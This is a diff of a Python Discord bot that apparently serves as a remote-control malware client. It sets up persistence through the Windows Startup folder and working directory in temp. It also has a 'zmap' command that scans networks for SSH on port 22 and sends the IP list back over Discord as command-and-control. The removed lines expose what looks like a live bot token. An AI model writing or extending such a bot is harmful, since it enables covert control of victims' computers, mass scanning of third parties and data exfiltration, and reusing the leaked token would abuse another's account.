@@ -1,8 +1,8 @@
 from discord.ext import commands
 import requests, platform, discord, urllib, psutil, socket, sys, os
 
-token = 'MTAzNzY3ODY2ODA5ODU4ODY3Mg.GZOFHP.uN2sDeIXq9rey5c6ci6ARKH9JyyiGgE9wWFE1M' # Token
-channel_id = 1045415824346853436  # Channel ID
+token = 'MToken.mnt.discord' # Token
+channel_id = 111111111111111111  # Channel ID
 
 # bot
 intents = discord.Intents.default()
@@ -20,15 +20,6 @@ else:
     startup = f"{appdata}\Microsoft\Windows\Start Menu\Programs\Startup"
     temp = os.getenv("temp")
     os.chdir(temp)
-
-def checkIfProcessRunning(processName):
-    for proc in psutil.process_iter():
-        try:
-            if processName.lower() in proc.name().lower():
-                return True
-        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-            pass
-    return False;
 
 # login
 @bot.event
@@ -162,7 +153,7 @@ async def zmap(ctx):
         p = os.popen(f"zmap -B 10M -p 22 -n 100 -o iplist.txt")
         await ctx.send(f"``[+] {hostname}@{ip}: ZMap started``")
 
-        if "whatever" not in p.read():
+        if "iplist" not in p.read():
             if os.path.exists("iplist.txt"):
                 await ctx.send(f"``[+] {hostname}@{ip}: ZMap report``",file=discord.File("iplist.txt"))
 
